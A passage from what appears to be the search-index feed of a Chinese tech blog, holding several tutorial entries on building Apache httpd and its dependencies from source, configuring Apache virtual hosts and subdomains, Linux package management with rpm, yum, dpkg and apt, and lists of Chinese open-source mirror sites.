operator">=</span>/usr/local/apr-iconv --with-apr<span class="token operator">=</span>/usr/local/apr<span class="token function">make</span> <span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="prce"><a href="#prce" class="headerlink" title="prce"></a>prce</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://sourceforge.net/projects/pcre/files/pcre/8.44/pcre-8.44.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pcre-8.44.tar.gz<span class="token builtin class-name">cd</span> pcre-8.44./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/pcre<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://apache.mirror.digitalpacific.com.au//httpd/httpd-2.4.48.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> httpd-2.4.48.tar.gz<span class="token builtin class-name">cd</span> httpd-2.4.48./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/httpd --with-apr<span class="token operator">=</span>/usr/local/apr/apr --with-apr-util<span class="token operator">=</span>/usr/local/apr/util --with-pcre<span class="token operator">=</span>/usr/local/pcre<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云部署apache二级域名</title>
      <link href="/2021/08/10/a-li-yun-bu-shu-apache-er-ji-yu-ming/"/>
      <url>/2021/08/10/a-li-yun-bu-shu-apache-er-ji-yu-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="阿里云部署apache二级域名"><a href="#阿里云部署apache二级域名" class="headerlink" title="阿里云部署apache二级域名"></a>阿里云部署apache二级域名</h1><h2 id="添加DNS解析记录"><a href="#添加DNS解析记录" class="headerlink" title="添加DNS解析记录"></a>添加DNS解析记录</h2><p>到阿里云控制台-&gt;云解析DNS-&gt;域名解析-&gt;解析设置-&gt;添加记录</p><p>主机记录就是你的二级域名</p><p>记录类型为A——指向IPV4</p><p>解析路线默认</p><p>记录值为你的外网IP</p><h2 id="配置Apache"><a href="#配置Apache" class="headerlink" title="配置Apache"></a>配置Apache</h2><p>编辑<code>httpd.conf</code></p><p>注释掉虚拟目录外的<code>DocumentRoot</code></p><p>添加</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">NameVirtualHost *:80<span class="token operator">&lt;</span>VirtualHost *:8<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>ServerAdmin root@localhostDocumentRoot <span class="token string">"/var/www/your1"</span>ServerName two1.yourname<span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/your1"</span><span class="token operator">&gt;</span>Options Indexes FollowSymLinksAllowOverride NoneRequire all granted<span class="token operator">&lt;</span>/Directory<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span class="token operator">&lt;</span>VirtualHost *:8<span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span>ServerAdmin root@localhostDocumentRoot <span class="token string">"/var/www/your2"</span>ServerName two2.yourname<span class="token operator">&lt;</span>Directory <span class="token string">"/var/www/your2"</span><span class="token operator">&gt;</span>Options Indexes FollowSymLinksAllowOverride NoneRequire all granted<span class="token operator">&lt;</span>/Directory<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/VirtualHost<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux安装软件包</title>
      <link href="/2021/08/02/linux-an-zhuang-ruan-jian-bao/"/>
      <url>/2021/08/02/linux-an-zhuang-ruan-jian-bao/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux安装软件包"><a href="#Linux安装软件包" class="headerlink" title="Linux安装软件包"></a>Linux安装软件包</h1><p>安装都是在root权限下执行的</p><h2 id="源码安装"><a href="#源码安装" class="headerlink" title="源码安装"></a>源码安装</h2><p>先从开源镜像站下载源码，例如：<a href="http://mirrors.163.com/">欢迎访问网易开源镜像站 (163.com)</a></p><p>有两种源码包</p><p>二进制包，一般会有版本号、操作系统之类的，名字比较长，里面的程序是已经编译果的，直接解压就可运行程序</p><ol><li>cd 到下载的包的目录</li><li>添加权限<code>chmod a+x xxx.bin</code></li><li>执行<code>./xxx.bin</code></li></ol><p>源码包（<code>apr-1.7.0.tar.gz</code>），需要编译才能运行</p><p>先安装C编辑器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>C++编辑器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> gcc-c++<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>cd 到存放源码压缩包的目录</p></li><li><p>解压缩</p><p><code>tar -zxvf xxx.tar.gz </code></p><p><code>tar -jxvf xxx.tar.bz</code></p></li><li><p>cd 进入解压后的目录</p></li><li><p>配置环境<code>./configure</code></p></li><li><p>对源代码进行编译<code>make</code></p></li><li><p>安装生成的二进制文件<code>make install</code></p></li><li><p>清理临时文件<code>make clean</code></p></li></ol><p>卸载<code>make uninstall</code></p><p><code>./configure</code>后面可以跟一些选项</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/xxx<span class="token comment">#设置安装目录,/xxx就是安装目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>默认配置文件<code>/usr/local</code></p></li><li><p>执行文件<code>/usr/local/bin</code></p></li><li><p>资源文件<code>/usr/local/share</code></p></li></ul><h2 id="RPM包安装"><a href="#RPM包安装" class="headerlink" title="RPM包安装"></a>RPM包安装</h2><p>RPM “RedHat Package Manager”，是RedHat公司研发的程序包管理器。rpm包是打包好了的，安装即使用</p><ol><li>下载软件包xxx.rpm</li><li>cd 到软件包目录</li><li>安装软件<code>rpm -ivh xx.rpm </code></li></ol><p>添加<code>--force</code>选项强制安装</p><p><code>xxx.src.rpm</code>源码安装需要编译</p><ol><li><code>rpm -ivh xxx.src.rpm</code></li><li><code>cd /usr/src/redhat/SPECS</code></li><li><code>rpmbuild -bp xxx.specs</code></li><li><code>cd /usr/src/redhat/BUILD/xxx/</code></li><li><code>./configure</code></li><li><code>make</code></li><li><code>make install</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rpm</span> <span class="token parameter variable">-e</span> xxx.rpm <span class="token comment">#卸载rpm包</span><span class="token function">rpm</span> <span class="token parameter variable">-ql</span> xxx <span class="token comment">#获取安装的位置</span><span class="token function">rpm</span> <span class="token parameter variable">-qi</span> xxx <span class="token comment">#查询包详细</span><span class="token function">rpm</span> <span class="token parameter variable">-qa</span> <span class="token comment">#列出安装过的包</span><span class="token function">rpm</span> <span class="token parameter variable">-list</span> <span class="token comment">#获得文件列表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>默认安装路径</p><ul><li><p>配置文件<code>/etc</code></p></li><li><p>可执行文件<code>/usr/bin</code></p></li><li><p>动态库<code>/usr/lib</code></p></li><li><p>帮助文档<code>/usr/share/doc</code></p></li><li><p>man page文件<code>/usr/share/man</code></p></li></ul></li></ul><h2 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h2><p>yum命令是在Fedora和RedHat以及SUSE中基于rpm的软件包管理器，它可以使系统管理人员交互和自动化地更细与管理RPM软件包，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装</p><p>仓库的配置文件<code>/etc/yum.repos.d</code>目录下</p><p><code>xxx</code>表示软件名或程序组名</p><p><strong>安装</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> <span class="token comment">#全部安装</span>yum <span class="token parameter variable">-y</span> <span class="token function">install</span> xxx <span class="token comment">#不询问安装</span>yum <span class="token function">install</span> xxx <span class="token comment">#安装指定的软件</span>yum groupinsall xxx <span class="token comment">#安装程序组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>更新和升级</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum update <span class="token comment">#全部更新</span>yum update xxx <span class="token comment">#更新指定程序包xxx</span>yum check-update <span class="token comment">#检查可更新的程序</span>yum upgrade xxx <span class="token comment">#升级指定程序包xxx</span>yum groupupdate xxx <span class="token comment">#升级程序组xxx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>查找和显示</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum info xxxx <span class="token comment">#显示安装包信息xxx</span>yum list <span class="token comment">#显示所有已经安装和可以安装的程序包</span>yum list xxx <span class="token comment">#显示指定程序包安装情况xxx</span>yum groupinfo xxx <span class="token comment">#显示程序组xxx信息</span>yum search string xxx <span class="token comment">#根据关键字string查找安装包</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>删除程序</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token operator">|</span> erase xxx <span class="token comment">#删除程序包xxx</span>yum groupremove xxx <span class="token comment">#删除程序组xxx</span>yum deplist xxx <span class="token comment">#查看程序xxx依赖情况</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>清除缓存</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum clean packages <span class="token comment">#清除缓存目录下的软件包</span>yum clean headers <span class="token comment">#清除缓存目录下的 headers</span>yum clean oldheaders <span class="token comment">#清除缓存目录下旧的 headers</span>yum clean, yum clean all <span class="token punctuation">(</span><span class="token operator">=</span> yum clean packages<span class="token punctuation">;</span> yum clean oldheaders<span class="token punctuation">)</span> <span class="token comment">#清除缓存目录下的软件包及旧的headers</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>默认安装路径</p><ul><li><p>配置文件<code>/etc</code></p></li><li><p>可执行文件<code>/usr/bin</code></p></li><li><p>动态库<code>/usr/lib</code></p></li><li><p>帮助文档<code>/usr/share/doc</code></p></li><li><p>man page文件<code>/usr/share/man</code></p></li></ul><h2 id="deb包安装"><a href="#deb包安装" class="headerlink" title="deb包安装"></a>deb包安装</h2><p>deb是Debian软件包格式，文件扩展名为.deb，处理这些包的经典程序是dpkg，经常是通过apt来运作</p><ol><li>cd 到安装包xxx.deb的目录</li><li>执行安装<code>dpkg -i xxx.deb</code></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg <span class="token parameter variable">-r</span> xxxSoftName <span class="token comment">#卸载</span>dpkg <span class="token parameter variable">-l</span> <span class="token string">'*xxx*'</span> <span class="token comment">#查询</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="apt安装"><a href="#apt安装" class="headerlink" title="apt安装"></a>apt安装</h2><p>apt-get 是 Debian，Ubuntu 发行版的包管理工具，适用于deb包管理式的操作系统</p><p>安装<code>apt-get install xxx</code> <strong>xxx</strong>一般是软件名加版本号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-cache</span> search xxx <span class="token comment">#搜寻软件xxx的名称,找到完整名称执行安装</span><span class="token function">apt-get</span> <span class="token function">install</span> xxx <span class="token comment">#安装</span><span class="token function">apt-get</span> remove xxx <span class="token comment">#卸载</span><span class="token function">apt-get</span> <span class="token parameter variable">--purge</span> remove xxx <span class="token comment">#连配置文件一起卸载</span><span class="token function">apt-get</span> autoremove xxx <span class="token comment">#删除包及其依赖的软件包</span>dpkg --force-all <span class="token parameter variable">--purge</span> xxx <span class="token comment">#强制卸载</span><span class="token function">apt-get</span> clean <span class="token comment">#清理备份</span><span class="token function">apt-cache</span> pkgnames <span class="token comment">#打印软件包列表中所有软件包的名称</span><span class="token function">apt-get</span> update <span class="token comment">#从软件源镜像服务器上下载/更新用于更新本地软件源的软件包</span><span class="token function">apt-get</span> upgrade <span class="token comment">#升级软件包到最新版本</span><span class="token function">apt-get</span> <span class="token parameter variable">-f</span> <span class="token function">install</span> <span class="token comment">#修复软件依赖包的关系</span><span class="token function">apt-get</span> dist-upgrade <span class="token comment">#升级系统</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安装路径</p><ul><li>源文件<code>/etc/apt/sources.list</code></li><li>保存从源下载的软件列表<code>/var/lib/apt/lists</code></li><li>下载的软件存放<code>/var/cache/apt/archives</code></li><li>安装后软件默认位置<code>/usr/share</code></li><li>可执行文件 <code>/usr/bin</code></li><li>配置文件<code>/etc</code></li><li>lib文件<code>/usr/lib</code></li></ul><h2 id="wget安装"><a href="#wget安装" class="headerlink" title="wget安装"></a>wget安装</h2><p>如果没有安装wget，<code>yum -y install wget</code></p><p>wget从指定的URL下载文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> url <span class="token comment">#直接下载url的资源到当前文件夹</span><span class="token function">wget</span> <span class="token parameter variable">-O</span> name url <span class="token comment">#保存为指定文件名</span><span class="token function">wget</span> <span class="token parameter variable">-c</span> url <span class="token comment">#断点续传</span><span class="token function">wget</span> <span class="token parameter variable">-b</span> url <span class="token comment">#后台下载</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>对于下载的文件包执行源码安装</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国内镜像源</title>
      <link href="/2021/08/02/guo-nei-jing-xiang-yuan/"/>
      <url>/2021/08/02/guo-nei-jing-xiang-yuan/</url>
      
        <content type="html"><![CDATA[<h1 id="国内镜像源"><a href="#国内镜像源" class="headerlink" title="国内镜像源"></a>国内镜像源</h1><ul><li><a href="http://mirrors.163.com/">欢迎访问网易开源镜像站 (163.com)</a></li><li><a href="https://developer.aliyun.com/mirror/">阿里巴巴开源镜像站-OPSX镜像站-阿里云开发者社区 (aliyun.com)</a></li><li><a href="https://mirrors.huaweicloud.com/home">华为开源镜像站_软件开发服务_华为云 (huaweicloud.com)</a></li><li><a href="https://mirrors.cloud.tencent.com/">腾讯软件源 (tencent.com)</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></li><li><a href="http://mirrors.ustc.edu.cn/">USTC Open Source Software Mirror</a></li><li><a href="http://mirror.bit.edu.cn/web/">北京理工大学 开源软件镜像服务 (bit.edu.cn)</a></li><li><a href="https://mirror.bjtu.edu.cn/">首页 - 北京交通大学自由与开源软件镜像站 (bjtu.edu.cn)</a></li><li><a href="http://mirror.azure.cn/">Mirror site (azure.cn)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache教程</title>
      <link href="/2021/08/01/apache/"/>
      <url>/2021/08/01/apache/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache教程"><a href="#Apache教程" class="headerlink" title="Apache教程"></a>Apache教程</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#安装Apache及其扩展包</span>yum <span class="token parameter variable">-y</span> <span class="token function">install</span> httpd httpd-manual mod_ssl mod_perl mod_auth_mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="启动、停止、重启"><a href="#启动、停止、重启" class="headerlink" title="启动、停止、重启"></a>启动、停止、重启</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#centos</span><span class="token function">service</span> httpd start<span class="token function">service</span> httpd stop<span class="token function">service</span> httpd restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="主要的配置文件"><a href="#主要的配置文件" class="headerlink" title="主要的配置文件"></a>主要的配置文件</h2><p>配置文件在<code>\etc\httpd</code>下面，主要的配置文件<code>\etc\httpd\conf\httpd.conf</code></p><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><table><thead><tr><th>属性名+值</th><th>意义</th></tr></thead><tbody><tr><td><code>ServerRoot "/your/index"</code></td><td>Apache安装的目录</td></tr><tr><td><code>Listen 80</code></td><td>监听的端口，可以开启多个端口</td></tr><tr><td><code>Include conf.modules.d/*.conf</code></td><td>加载文件中的所有模块</td></tr><tr><td><code>LoadModule foo_module modules/mod_foo.so</code></td><td>加载单独模块</td></tr><tr><td><code>LoadFile</code></td><td>和<code>LoadModule</code>类似，但使用绝对路径</td></tr><tr><td><code>User username</code></td><td>运行时的用户名</td></tr><tr><td><code>Group groupname</code></td><td>运行时的用户组</td></tr><tr><td><code>ServerAdmin root@localhost</code></td><td>管理员的邮件地址</td></tr><tr><td><code>ServerName www.example.com:80</code></td><td>主站点名称，可以是域名也能是IP，不写时自动配置</td></tr><tr><td><code>DocumentRoot "/var/www/html"</code></td><td>主站点的网页存储位置</td></tr><tr><td><code>DirectoryIndex index</code></td><td>默认索引目录</td></tr><tr><td><code>RequestReadTimeout</code></td><td>允许限制客户端发送请求所花费的时间</td></tr><tr><td><code>TimeOut</code></td><td>传输或接收的延时，大于这个时间SERVER 会断开这个链接</td></tr><tr><td><code>KeepAliveTimeout</code></td><td>等待下一个请求的时间</td></tr><tr><td><code>MaxClients</code></td><td>允许的最大客户个数</td></tr><tr><td><code>KeepAlive</code></td><td>是否允许一个链接同时发出多的请求</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="目录访问权限控制"><a href="#目录访问权限控制" class="headerlink" title="目录访问权限控制"></a>目录访问权限控制</h3><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltDirectory "/yourindex"&gt; &amp;ltFiles "private.html"&gt;        Require all denied    &amp;lt/Files&gt;Options FollowSymLinks AllowOverride None Order allow,deny Allow from all #Require all granted #Apache2.2后替换Order&amp;lt/Directory&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>Directory</code></td><td>权限配置的容器名（文件系统容器），路径能正则匹配</td></tr><tr><td><code>/yourindex</code></td><td>需要配置权限的目录</td></tr><tr><td><code>Files</code></td><td>指定文件权限，路径能正则匹配</td></tr><tr><td><code>Options</code></td><td>配置在特定目录使用的特性</td></tr><tr><td><code>None</code></td><td>不启用任何额外功能</td></tr><tr><td><code>ExecCGI</code></td><td>在该目录下允许执行CGI脚本</td></tr><tr><td><code>FollowSymlinks</code></td><td>允许指定目录下的文件连接到目录外的文件或目录（在该目录下允许文件系统使用符号连接）</td></tr><tr><td><code>Indexes</code></td><td>当用户访问该目录时，如果用户找不到<code>DirectoryIndex</code>指定的主页文件(例如<code>index.html</code>)，则返回该目录下的文件列表给用户</td></tr><tr><td><code>SymLinksIfOwnerMatch</code></td><td>当使用符号连接时，只有当符号连接的文件拥有者与实际文件的拥有者相同时才可以访问。</td></tr><tr><td><code>All</code></td><td>开启除 <code>MultiViews</code> 之外的所有选项</td></tr><tr><td><code>AllowOverride</code></td><td>允许存在于<code>.htaccess</code>文件中的指令类型</td></tr><tr><td><code>None</code></td><td>不搜索该目录下的<code>.htaccess</code>文件</td></tr><tr><td><code>All</code></td><td>在<code>.htaccess</code>文件中可以使用所有的指令</td></tr><tr><td><code>Order</code></td><td>控制在访问时<code>Allow</code>和<code>Deny</code>两个访问规则哪个优先</td></tr><tr><td><code>Allow</code></td><td>允许访问的主机列表(可用域名或子网，例如：<code>Allow from 192.168.0.0/16</code>)</td></tr><tr><td><code>Deny</code></td><td>拒绝访问的主机列表</td></tr><tr><td><code>Order deny,allow</code></td><td>先检查拒绝，再检查允许，当拒绝与允许有冲突时，允许优先，默认规则为允许</td></tr><tr><td><code>Order allow,deny</code></td><td>先检查允许，再检查拒绝，当允许与拒绝有冲突时，拒绝优先。默认规则为拒绝</td></tr><tr><td><code>Require</code></td><td>测试经过身份验证的用户是否由授权提供者授权，Apache2.2后替换Order</td></tr><tr><td><code>Require all granted</code></td><td>允许所有访问请求</td></tr><tr><td><code>Require all denied</code></td><td>拒绝所有访问请求</td></tr><tr><td><code>Require ip ip1 ip2</code></td><td>只允许来自特定IP或IP段的访问请求，其他请求将被拒绝</td></tr><tr><td><code>Require host x.com</code></td><td>只允许来自特定域名主机的访问请求，其他请求将被拒绝</td></tr><tr><td><code>Require not ip ip1</code></td><td>拒绝ip1</td></tr><tr><td><code>Require not host gov</code></td><td>拒绝gov</td></tr><tr><td>…</td><td></td></tr></tbody></table><h3 id="虚拟主机容器"><a href="#虚拟主机容器" class="headerlink" title="虚拟主机容器"></a>虚拟主机容器</h3><h4 id="VirtualHost"><a href="#VirtualHost" class="headerlink" title="VirtualHost"></a>VirtualHost</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost 10.1.2.3:80&gt;  ServerAdmin webmaster@host.example.com  DocumentRoot "/www/docs/host.example.com"  ServerName host.example.com  ServerAlias server server2.example.com server2  ServerAlias *.example.com  UseCanonicalName Off  ErrorLog "logs/host.example.com-error_log"  TransferLog "logs/host.example.com-access_log"&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th>属性名</th><th>意义</th></tr></thead><tbody><tr><td><code>VirtualHost</code></td><td>包含一组仅适用于特定虚拟主机的指令</td></tr><tr><td><code>ServerAlias</code></td><td>为主机名创建一个别名</td></tr><tr><td><code>ProxyPreserveHost On     </code></td><td>使用传入的主机 HTTP 请求标头进行代理请求</td></tr><tr><td><code> ProxyPass "/" "http://192.168.111.2/"</code></td><td>将远程服务器映射到本地服务器 URL 空间</td></tr><tr><td><code>ProxyPassReverse "/" "http://192.168.111.2/"</code></td><td>调整从反向代理服务器发送的 HTTP 响应标头中的 URL</td></tr><tr><td><code>ServerPath</code></td><td>由不兼容的浏览器访问的基于名称的虚拟主机的旧 URL 路径名</td></tr><tr><td><code>RewriteRule</code></td><td>定义重写引擎的规则</td></tr><tr><td>….</td><td></td></tr></tbody></table><h4 id="在单个-IP-地址上运行多个基于名称的网站"><a href="#在单个-IP-地址上运行多个基于名称的网站" class="headerlink" title="在单个 IP 地址上运行多个基于名称的网站"></a>在单个 IP 地址上运行多个基于名称的网站</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config"># Ensure that Apache listens on port 80Listen 80&amp;ltVirtualHost *:80&gt;    DocumentRoot "/www/example1"    ServerName www.example.com    # Other directives here&amp;lt/VirtualHost&gt;&amp;ltVirtualHost *:80&gt;    DocumentRoot "/www/example2"    ServerName www.example.org    # Other directives here&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="多个-IP-地址上的基于名称的主机"><a href="#多个-IP-地址上的基于名称的主机" class="headerlink" title="多个 IP 地址上的基于名称的主机"></a>多个 IP 地址上的基于名称的主机</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80# This is the "main" server running on 172.20.30.40ServerName server.example.comDocumentRoot "/www/mainserver"&amp;ltVirtualHost 172.20.30.50&gt;    DocumentRoot "/www/example1"    ServerName www.example.com    # Other directives here ...&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50&gt;    DocumentRoot "/www/example2"    ServerName www.example.org    # Other directives here ...&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="在不同的-IP-地址（例如内部和外部地址）上提供相同的内容"><a href="#在不同的-IP-地址（例如内部和外部地址）上提供相同的内容" class="headerlink" title="在不同的 IP 地址（例如内部和外部地址）上提供相同的内容"></a>在不同的 IP 地址（例如内部和外部地址）上提供相同的内容</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">&amp;ltVirtualHost 192.168.1.1 172.20.30.40&gt;    DocumentRoot "/www/server1"    ServerName server.example.com    ServerAlias server&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="在不同的端口上运行不同的站点"><a href="#在不同的端口上运行不同的站点" class="headerlink" title="在不同的端口上运行不同的站点"></a>在不同的端口上运行不同的站点</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80Listen 8080&amp;ltVirtualHost 172.20.30.40:80&gt;    ServerName www.example.com    DocumentRoot "/www/domain-80"&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:8080&gt;    ServerName www.example.com    DocumentRoot "/www/domain-8080"&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:80&gt;    ServerName www.example.org    DocumentRoot "/www/otherdomain-80"&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:8080&gt;    ServerName www.example.org    DocumentRoot "/www/otherdomain-8080"&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="基于IP的虚拟主机"><a href="#基于IP的虚拟主机" class="headerlink" title="基于IP的虚拟主机"></a>基于IP的虚拟主机</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example1"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50&gt;    DocumentRoot "/www/example2"    ServerName www.example.org&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="基于端口和基于-ip-的混合虚拟主机"><a href="#基于端口和基于-ip-的混合虚拟主机" class="headerlink" title="基于端口和基于 ip 的混合虚拟主机"></a>基于端口和基于 ip 的混合虚拟主机</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 172.20.30.40:80Listen 172.20.30.40:8080Listen 172.20.30.50:80Listen 172.20.30.50:8080&amp;ltVirtualHost 172.20.30.40:80&gt;    DocumentRoot "/www/example1-80"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40:8080&gt;    DocumentRoot "/www/example1-8080"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50:80&gt;    DocumentRoot "/www/example2-80"    ServerName www.example.org&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.50:8080&gt;    DocumentRoot "/www/example2-8080"    ServerName www.example.org&amp;lt/VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="混合基于名称和基于-IP-的虚拟主机"><a href="#混合基于名称和基于-IP-的虚拟主机" class="headerlink" title="混合基于名称和基于 IP 的虚拟主机"></a>混合基于名称和基于 IP 的虚拟主机</h4><pre class="line-numbers language-config" data-language="config"><code class="language-config">Listen 80&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example1"    ServerName www.example.com&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example2"    ServerName www.example.org&amp;lt/VirtualHost&gt;&amp;ltVirtualHost 172.20.30.40&gt;    DocumentRoot "/www/example3"    ServerName www.example.net&amp;lt/VirtualHost&gt;# IP-based&amp;ltVirtualHost 